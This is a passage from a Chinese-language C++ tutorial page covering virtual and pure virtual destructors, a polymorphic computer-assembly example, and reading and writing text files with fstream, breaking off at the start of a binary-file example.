虚析构和纯虚析构</h4><p>多态使用时，如果子类中有属性开辟到堆区，那么父类指针在释放时无法调用到子类的析构代码</p><p>解决方式：将父类中的析构函数改为<strong>虚析构</strong>或者<strong>纯虚析构</strong></p><p>虚析构和纯虚析构共性：</p><ul><li>可以解决父类指针释放子类对象</li><li>都需要有具体的函数实现</li></ul><p>虚析构和纯虚析构区别：</p><ul><li>如果是纯虚析构，该类属于抽象类，无法实例化对象</li></ul><p>虚析构语法：</p><p><code>virtual ~类名()&#123;&#125;</code></p><p>纯虚析构语法：</p><p><code>virtual ~类名() = 0;</code></p><p><code>类名::~类名()&#123;&#125;</code></p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">Animal()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Animal 构造函数调用！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">Speak</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//析构函数加上virtual关键字，变成虚析构函数</span></span><br><span class="line"><span class="comment">//virtual ~Animal()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;Animal虚析构函数调用！&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">virtual ~Animal() = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Animal::~Animal()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Animal 纯虚析构函数调用！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//和包含普通纯虚函数的类一样，包含了纯虚析构函数的类也是一个抽象类。不能够被实例化。</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> :</span> public Animal &#123;</span><br><span class="line">public:</span><br><span class="line">Cat(<span class="built_in">string</span> name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cat构造函数调用！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">m_Name = new <span class="built_in">string</span>(name);</span><br><span class="line">&#125;</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">Speak</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; *m_Name &lt;&lt;  <span class="string">&quot;小猫在说话!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">~Cat()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cat析构函数调用!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (this-&gt;m_Name != <span class="literal">NULL</span>) &#123;</span><br><span class="line">delete m_Name;</span><br><span class="line">m_Name = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"><span class="built_in">string</span> *m_Name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Animal *animal = new Cat(<span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">animal-&gt;Speak();</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过父类指针去释放，会导致子类对象可能清理不干净，造成内存泄漏</span></span><br><span class="line"><span class="comment">//怎么解决？给基类增加一个虚析构函数</span></span><br><span class="line"><span class="comment">//虚析构函数就是用来解决通过父类指针释放子类对象</span></span><br><span class="line">delete animal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结:</p><ol><li><p>虚析构或纯虚析构就是用来解决通过父类指针释放子类对象</p></li><li><p>如果子类中没有堆区数据，可以不写为虚析构或纯虚析构</p></li><li><p>拥有纯虚析构函数的类也属于抽象类</p></li></ol><h4 id="4-7-6-多态案例三-电脑组装">4.7.6 多态案例三-电脑组装</h4><p><strong>案例描述：</strong></p><p>电脑主要组成部件为 CPU（用于计算），显卡（用于显示），内存条（用于存储）</p><p>将每个零件封装出抽象基类，并且提供不同的厂商生产不同的零件，例如 Intel 厂商和 Lenovo 厂商</p><p>创建电脑类提供让电脑工作的函数，并且调用每个零件工作的接口</p><p>测试时组装三台不同的电脑进行工作</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象CPU类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CPU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="comment">//抽象的计算函数</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">calculate</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象显卡类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VideoCard</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="comment">//抽象的显示函数</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象内存条类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="comment">//抽象的存储函数</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">storage</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//电脑类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Computer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">Computer(CPU * cpu, VideoCard * vc, Memory * mem)</span><br><span class="line">&#123;</span><br><span class="line">m_cpu = cpu;</span><br><span class="line">m_vc = vc;</span><br><span class="line">m_mem = mem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提供工作的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">work</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//让零件工作起来，调用接口</span></span><br><span class="line">m_cpu-&gt;calculate();</span><br><span class="line"></span><br><span class="line">m_vc-&gt;display();</span><br><span class="line"></span><br><span class="line">m_mem-&gt;storage();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提供析构函数 释放3个电脑零件</span></span><br><span class="line">~Computer()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放CPU零件</span></span><br><span class="line"><span class="keyword">if</span> (m_cpu != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">delete m_cpu;</span><br><span class="line">m_cpu = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放显卡零件</span></span><br><span class="line"><span class="keyword">if</span> (m_vc != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">delete m_vc;</span><br><span class="line">m_vc = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放内存条零件</span></span><br><span class="line"><span class="keyword">if</span> (m_mem != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">delete m_mem;</span><br><span class="line">m_mem = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line"></span><br><span class="line">CPU * m_cpu; <span class="comment">//CPU的零件指针</span></span><br><span class="line">VideoCard * m_vc; <span class="comment">//显卡零件指针</span></span><br><span class="line">Memory * m_mem; <span class="comment">//内存条零件指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体厂商</span></span><br><span class="line"><span class="comment">//Intel厂商</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IntelCPU</span> :</span>public CPU</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">calculate</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Intel的CPU开始计算了！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IntelVideoCard</span> :</span>public VideoCard</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Intel的显卡开始显示了！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IntelMemory</span> :</span>public Memory</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">storage</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Intel的内存条开始存储了！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lenovo厂商</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LenovoCPU</span> :</span>public CPU</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">calculate</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lenovo的CPU开始计算了！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LenovoVideoCard</span> :</span>public VideoCard</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lenovo的显卡开始显示了！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LenovoMemory</span> :</span>public Memory</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">storage</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lenovo的内存条开始存储了！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//第一台电脑零件</span></span><br><span class="line">CPU * intelCpu = new IntelCPU;</span><br><span class="line">VideoCard * intelCard = new IntelVideoCard;</span><br><span class="line">Memory * intelMem = new IntelMemory;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;第一台电脑开始工作：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//创建第一台电脑</span></span><br><span class="line">Computer * computer1 = new Computer(intelCpu, intelCard, intelMem);</span><br><span class="line">computer1-&gt;work();</span><br><span class="line">delete computer1;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;第二台电脑开始工作：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//第二台电脑组装</span></span><br><span class="line">Computer * computer2 = new Computer(new LenovoCPU, new LenovoVideoCard, new LenovoMemory);;</span><br><span class="line">computer2-&gt;work();</span><br><span class="line">delete computer2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;第三台电脑开始工作：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//第三台电脑组装</span></span><br><span class="line">Computer * computer3 = new Computer(new LenovoCPU, new IntelVideoCard, new LenovoMemory);;</span><br><span class="line">computer3-&gt;work();</span><br><span class="line">delete computer3;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-文件操作">5 文件操作</h2><p>程序运行时产生的数据都属于临时数据，程序一旦运行结束都会被释放</p><p>通过<strong>文件可以将数据持久化</strong></p><p>C++中对文件操作需要包含头文件 &lt; fstream &gt;</p><p>文件类型分为两种：</p><ol><li><strong>文本文件</strong>     -   文件以文本的<strong>ASCII 码</strong>形式存储在计算机中</li><li><strong>二进制文件</strong> -   文件以文本的<strong>二进制</strong>形式存储在计算机中，用户一般不能直接读懂它们</li></ol><p>操作文件的三大类:</p><ol><li>ofstream：写操作</li><li>ifstream： 读操作</li><li>fstream ： 读写操作</li></ol><h3 id="5-1-文本文件">5.1 文本文件</h3><h4 id="5-1-1-写文件">5.1.1 写文件</h4><p>写文件步骤如下：</p><ol><li>包含头文件</li></ol><p>#include <fstream></p><ol start="2"><li>创建流对象</li></ol><p>ofstream ofs;</p><ol start="3"><li>打开文件</li></ol><p>ofs.open(“文件路径”,打开方式);</p><ol start="4"><li>写数据</li></ol><p>ofs &lt;&lt; “写入的数据”;</p><ol start="5"><li>关闭文件</li></ol><p>ofs.close();</p><p>文件打开方式：</p><table><thead><tr><th>打开方式</th><th>解释</th></tr></thead><tbody><tr><td>ios::in</td><td>为读文件而打开文件</td></tr><tr><td>ios::out</td><td>为写文件而打开文件</td></tr><tr><td>ios::ate</td><td>初始位置：文件尾</td></tr><tr><td>ios::app</td><td>追加方式写文件</td></tr><tr><td>ios::trunc</td><td>如果文件存在先删除，再创建</td></tr><tr><td>ios::binary</td><td>二进制方式</td></tr></tbody></table><p><strong>注意：</strong> 文件打开方式可以配合使用，利用|操作符</p><p>**例如：**用二进制方式写文件 <code>ios::binary | ios:: out</code></p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">ofstream ofs;</span><br><span class="line">ofs.open(<span class="string">&quot;test.txt&quot;</span>, ios::out);</span><br><span class="line"></span><br><span class="line">ofs &lt;&lt; <span class="string">&quot;姓名：张三&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ofs &lt;&lt; <span class="string">&quot;性别：男&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ofs &lt;&lt; <span class="string">&quot;年龄：18&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">ofs.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>文件操作必须包含头文件 fstream</li><li>读文件可以利用 ofstream  ，或者 fstream 类</li><li>打开文件时候需要指定操作文件的路径，以及打开方式</li><li>利用&lt;&lt;可以向文件中写数据</li><li>操作完毕，要关闭文件</li></ul><h4 id="5-1-2-读文件">5.1.2 读文件</h4><p>读文件与写文件步骤相似，但是读取方式相对于比较多</p><p>读文件步骤如下：</p><ol><li>包含头文件</li></ol><p>#include <fstream></p><ol start="2"><li>创建流对象</li></ol><p>ifstream ifs;</p><ol start="3"><li>打开文件并判断文件是否打开成功</li></ol><p>ifs.open(“文件路径”,打开方式);</p><ol start="4"><li>读数据</li></ol><p>四种方式读取</p><ol start="5"><li>关闭文件</li></ol><p>ifs.close();</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">ifstream ifs;</span><br><span class="line">ifs.open(<span class="string">&quot;test.txt&quot;</span>, ios::in);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ifs.is_open())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;文件打开失败&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一种方式</span></span><br><span class="line"><span class="comment">//char buf[1024] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="comment">//while (ifs &gt;&gt; buf)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; buf &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种</span></span><br><span class="line"><span class="comment">//char buf[1024] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="comment">//while (ifs.getline(buf,sizeof(buf)))</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; buf &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第三种</span></span><br><span class="line"><span class="comment">//string buf;</span></span><br><span class="line"><span class="comment">//while (getline(ifs, buf))</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; buf &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">while</span> ((c = ifs.get()) != EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ifs.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>读文件可以利用 ifstream  ，或者 fstream 类</li><li>利用 is_open 函数可以判断文件是否打开成功</li><li>close 关闭文件</li></ul><h3 id="5-2-二进制文件">5.2 二进制文件</h3><p>以二进制的方式对文件进行读写操作</p><p>打开方式要指定为 ios::binary</p><h4 id="5-2-1-写文件">5.2.1 写文件</h4><p>二进制方式写文件主要利用流对象调用成员函数 write</p><p>函数原型 ：<code>ostream&amp; write(const char * buffer,int len);</code></p><p>参数解释：字符指针 buffer 指向内存中一段存储空间。len 是读写的字节数</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">char</span> m_Name[<span class="number">64</span>];</span><br><span class="line"><span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二进制文件  写文件</span></span><br><span class="line"><span class="type">void</span> <span class="title 